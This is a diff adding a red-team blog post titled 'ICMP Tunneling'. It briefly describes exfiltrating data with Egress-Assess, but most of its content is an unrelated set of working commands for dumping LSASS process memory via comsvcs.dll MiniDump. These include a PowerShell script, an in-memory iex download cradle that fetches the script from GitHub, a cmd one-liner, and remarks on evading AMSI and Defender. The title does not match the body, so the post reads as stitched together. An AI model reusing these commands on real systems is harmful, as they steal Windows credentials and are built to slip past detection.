@@ -1,0 +1,55 @@
+---
+title:  "ICMP Tunneling"
+date:   2021-10-10 19:12:00 +0000
+categories: [techniques]
+tags: [windows, ICMP, Data Extraction]
+---
+
+I recently had a situation during an engagement where i needed to demonstrate that data could be extracted from the organisation. I wanted to exfil data without going over the internet for security as well as for ease of use duing the engagement and speed.
+The VPN when connected, and as expected, didn't allow local access as all routing went through the established tunnel first. However when the tunnel was disconnected the firewall would block all TCP and UDP access but would allow ICMP traffic to local subnets.
+This then led me to look into ICMP tunneling. I found various ways of gaining a reverse shell however data exfiltration was more tricky - this is where Egress Assess comes in.   
+From the github page - "Egress-Assess is a tool used to test egress data detection capabilities."
+
+Egress-Assess has many use cases for confirming if data can be extracted out of the network including HTTP, SMB, ICMP and more. It also has PowerShell and Python implementations for both server and client. This is good for us as its unliekly that we normally have PowerShell access on Windows based systems.
+Another great feature is that the client doesnt require local administrative privileges to run.
+During testing it was also noted that as from the time of testing amsi didnt detect the client software as malicous or blocked the traffic as suspicous.
+
+
+
+
+
+
+
+{% include codeHeader.html %}
+```
+$processes = Get-Process
+$location = Get-Location
+$dumpid = foreach ($process in $processes){if ($process.ProcessName -eq "lsass"){$process.id}}
+	Write-Host "Found l s a s s process with ID $dumpid - starting dump with rundll32"
+	Write-Host "Dumpfile goes to Get-Location\$env:COMPUTERNAME.bin"
+	rundll32 C:\Windows\System32\comsvcs.dll, MiniDump $dumpid $location\$env:COMPUTERNAME.bin full | Out-Null
+	Compress-Archive -Path $location\$env:COMPUTERNAME.bin -DestinationPath $location\$env:COMPUTERNAME.zip -CompressionLevel NoCompression
+```
+
+
+We can also encode and encrypt the script to make it harder to be detected and run it straight in memory via Invoke Expression.
+
+```
+iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/sp00ks-git/PowerShell-Stuff/main/lsass-dump')
+```
+
+
+Another way is by using a for loop as follows:
+
+```
+for /f "tokens=1,2 delims= " ^%A in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump ^%B lsass.dmp full
+```
+
+![img-description](/images/lsass-1.png)
+_LSASS Dumping with uptodate Defender Definitions"_
+
+
+![img-description](/images/lsass-2.png)
+_executing the script_
+
+
